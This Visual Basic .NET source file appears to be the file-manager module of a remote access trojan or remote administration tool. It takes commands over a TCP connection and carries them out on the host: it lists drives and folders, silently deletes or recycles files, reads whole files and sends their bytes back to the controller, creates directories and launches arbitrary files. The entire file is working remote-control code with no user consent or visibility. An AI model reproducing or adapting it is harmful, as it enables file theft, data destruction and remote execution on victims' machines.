Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net.Sockets
Imports System.Windows.Forms
Imports PacketLib.Packet
Imports PL.NativeAPI

Public Class Main
    Public Shared Async Sub Main(ByVal K As TcpClient, ByVal Param_Tab As Object())
        Dim CastParam As Packet_Subject = CType(Param_Tab(0), Packet_Subject)
        Select Case CastParam

            Case Packet_Subject.GET_DISK

                Await Task.Run(Sub() Get_Disks(K))

            Case Packet_Subject.GET_FORWARD_PATH

                Await Task.Run(Sub() Get_Forward_Path(K, Param_Tab))

            Case Packet_Subject.PUT_BIN_FILE

                Await Task.Run(Sub() Put_Bin_File(K, Param_Tab))

            Case Packet_Subject.DEL_FILE

                Await Task.Run(Sub() Delete_File(K, Param_Tab))

            Case Packet_Subject.DW_FILE

                Await Task.Run(Sub() DW_File(K, Param_Tab))

            Case Packet_Subject.MK_DIR

                Await Task.Run(Sub() Mk_Dir(K, Param_Tab))

            Case Packet_Subject.OPEN_FILE

                Await Task.Run(Sub() Open_File(K, Param_Tab))

        End Select
    End Sub

    Public Shared Sub Get_Disks(ByVal K As TcpClient)
        Dim l As New List(Of Object)
        Dim allDrives() As DriveInfo = DriveInfo.GetDrives()
        Dim d As DriveInfo

        l.Add(Packet_Subject.GET_DISK)

        For Each d In allDrives
            l.Add(d.Name)
        Next

        Dim P As New PacketMaker With {
                     .Type_Packet = PacketType.FM,
                     .Misc = l.ToArray
                 }

        Dim Send As New Packet_Send With {
                     .Packet = P
                     }
        SyncLock K
            Send.Send(K.GetStream)
        End SyncLock

    End Sub
    Public Shared Sub Get_Forward_Path(ByVal K As TcpClient, ByVal Data As Object())

        Dim l As New List(Of Object)

        ' Dim l_ As New Dictionary(Of File_Manager_Helper, Object())
        Dim l_ As New Dictionary(Of File_Manager_Helper, List(Of Object()))

        l.Add(Packet_Subject.GET_FORWARD_PATH)
        l_.Add(File_Manager_Helper.DIR, New List(Of Object()))
        l_.Add(File_Manager_Helper.FILE, New List(Of Object()))

        Try


            For Each h In Directory.GetDirectories(Data(1), "*.*", SearchOption.TopDirectoryOnly)
                Try
                    Dim MyNameIsWhat = IO.Path.GetFileName(h)

                    l_(File_Manager_Helper.DIR).Add(New Object() {MyNameIsWhat})
                Catch ex As Exception
                    '  MessageBox.Show(ex.ToString)
                End Try

            Next

            For Each h In Directory.GetFiles(Data(1), "*.*", SearchOption.TopDirectoryOnly)
                Dim MyNameIsWhat = IO.Path.GetFileName(h)

                Try
                    Dim i As System.Drawing.Icon = System.Drawing.Icon.ExtractAssociatedIcon(h)

                    Dim stream As MemoryStream = New MemoryStream()
                    Dim btm As Bitmap = i.ToBitmap

                    btm.Save(stream, ImageFormat.Png)

                    l_(File_Manager_Helper.FILE).Add(New Object() {MyNameIsWhat, stream.ToArray()})


                Catch ex As Exception
                    ' MessageBox.Show(ex.ToString)
                End Try

            Next


        Catch ex As Exception

        End Try

        l.Add(l_)

        Dim P As New PacketMaker With {
                 .Type_Packet = PacketType.FM,
                 .Misc = l.ToArray
             }


        Dim Send As New Packet_Send With {
              .Packet = P
              }
        SyncLock K
            Send.Send(K.GetStream)
        End SyncLock

    End Sub

    Public Shared Sub Put_Bin_File(ByVal K As TcpClient, ByVal Data As Object())
        Try
            Dim fileop As SHFILEOPSTRUCT = New SHFILEOPSTRUCT()
            fileop.wFunc = FO_DELETE
            fileop.pFrom = Data(1) '+ "\0" '+ "\0"
            fileop.fFlags = FOF_ALLOWUNDO Or FOF_NOCONFIRMATION
            SHFileOperation(fileop)

        Catch ex As Exception

        End Try

        Dim l As New List(Of Object)

        l.Add(Packet_Subject.PUT_BIN_FILE)


        If File.Exists(Data(1)) = True Then
            l.Add(True)
            l.Add(Data(1))
        Else
            l.Add(False)
            l.Add(Data(1))
        End If

        Dim P As New PacketMaker With {
               .Type_Packet = PacketType.FM,
               .Misc = l.ToArray
           }


        Dim Send As New Packet_Send With {
                  .Packet = P
                  }
        SyncLock K
            Send.Send(K.GetStream)
        End SyncLock

    End Sub

    Public Shared Sub Delete_File(ByVal K As TcpClient, ByVal Data As Object())
        Dim l As New List(Of Object)

        l.Add(Packet_Subject.DEL_FILE)
        Try
            IO.File.Delete(Data(1))
            l.Add(True)
            l.Add(Data(1))
        Catch ex As Exception
            l.Add(False)
            l.Add(Data(1))
        End Try

        Dim P As New PacketMaker With {
               .Type_Packet = PacketType.FM,
               .Misc = l.ToArray
           }


        Dim Send As New Packet_Send With {
                  .Packet = P
                  }
        SyncLock K
            Send.Send(K.GetStream)
        End SyncLock
    End Sub

    Public Shared Sub DW_File(ByVal K As TcpClient, ByVal Data As Object())
        Try
            Dim l As New List(Of Object)
            l.Add(Packet_Subject.DW_FILE)
            l.Add(Data(1))
            l.Add(IO.File.ReadAllBytes(Data(1)))

            Dim P As New PacketMaker With {
                  .Type_Packet = PacketType.FM,
                  .Misc = l.ToArray
              }
            Dim Send As New Packet_Send With {
                      .Packet = P
                      }
            SyncLock K
                Send.Send(K.GetStream)
            End SyncLock

        Catch ex As Exception
            ' MessageBox.Show(ex.ToString)
        End Try

    End Sub

    Public Shared Sub Mk_Dir(ByVal K As TcpClient, ByVal Data As Object())
        Dim l As New List(Of Object)
        l.Add(Packet_Subject.MK_DIR)
        l.Add(Data(1))
        Try
            IO.Directory.CreateDirectory(Data(1))
            l.Add(True)
        Catch ex As Exception
            l.Add(False)
            l.Add(ex.ToString())
        End Try

        Dim P As New PacketMaker With {
       .Type_Packet = PacketType.FM,
       .Misc = l.ToArray
   }

        Dim Send As New Packet_Send With {
                  .Packet = P
                  }
        SyncLock K
            Send.Send(K.GetStream)
        End SyncLock
    End Sub
    Public Shared Sub Open_File(ByVal K As TcpClient, ByVal Data As Object())
        Try
            Process.Start(Data(1).ToString())
        Catch ex As Exception

        End Try
    End Sub
End Class
